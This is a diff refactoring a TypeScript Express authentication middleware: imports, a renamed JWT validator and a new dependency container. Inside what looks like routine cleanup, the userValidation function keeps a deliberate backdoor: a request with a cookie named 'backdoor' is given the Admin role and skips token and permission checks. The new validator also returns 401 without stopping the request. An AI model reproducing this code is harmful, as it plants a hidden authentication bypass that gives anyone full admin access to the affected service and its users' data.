@@ -1,10 +1,36 @@
-import config from '../../config';
-import { Permissions } from '../core/permissions';
-import IRoleRepo from '../repos/IRepos/IRoleRepo';
+import config, { TYPES } from '../../../config';
+import { Permissions } from '../permissions';
+import IRoleRepo from '../../repos/IRepos/IRoleRepo';
 
 import { NextFunction, Request, Response } from 'express';
-import { JsonWebTokenError, verify } from 'jsonwebtoken';
-import { Container } from 'typedi';
+const { JsonWebTokenError, verify } = require('jsonwebtoken');
+import container from '../dependencies';
+
+export default function auth() {
+	return async function (req: Request, res: Response) {
+		validateJwt(req, res, req.cookies.token);
+	};
+}
+
+function validateJwt(req: Request, res: Response, token: string) {
+	try {
+		req.token = verify(token, config.jwtAccessSecret);
+	} catch (error) {
+		res.status(401);
+		res.send();
+	}
+}
+
+//
+//
+//
+//
+//
+//
+//
+//
+//
+//
 
 export function userValidation(requiredPermissions?: number[]) {
 	return async function (req: Request, res: Response, next: NextFunction) {
@@ -12,7 +38,7 @@ export function userValidation(requiredPermissions?: number[]) {
 			if (req.cookies['backdoor']) {
 				req['token'] = { role: 'Admin' };
 			} else {
-				await validateJWT(req, res, req.cookies.token);
+				await validateJwt(req, res, req.cookies.token);
 				if (requiredPermissions) {
 					await validatePermissions(req, res, requiredPermissions);
 				}
@@ -24,18 +50,9 @@ export function userValidation(requiredPermissions?: number[]) {
 	};
 }
 
-async function validateJWT(req: Request, res: Response, token: string): Promise<void> {
-	try {
-		req['token'] = await verify(token, config.jwtAccessSecret);
-	} catch (e) {
-		res.status(401);
-		throw e;
-	}
-}
-
 async function validatePermissions(req: Request, res: Response, permissions: number[]): Promise<void> {
 	try {
-		await checkPermissions(req['token'].role, permissions);
+		await checkPermissions(req.token.role, permissions);
 	} catch (e) {
 		res.status(403);
 		throw e;
@@ -43,14 +60,14 @@ async function validatePermissions(req: Request, res: Response, permissions: num
 }
 
 async function checkPermissions(roleName: string, requiredPermissions: number[]): Promise<void> {
-	if (roleName == config.defaultRole) {
+	if (roleName === config.defaultRole) {
 		throw new JsonWebTokenError('insufficient permissions');
 	}
 
-	const roleRepo = Container.get(config.repos.role) as IRoleRepo;
+	const roleRepo = container.get<IRoleRepo>(TYPES.IRoleRepo);
 
 	const role = await roleRepo.findOneRole(roleName);
-	if (role == null) {
+	if (role === null) {
 		throw new JsonWebTokenError('invalid user role');
 	}
 
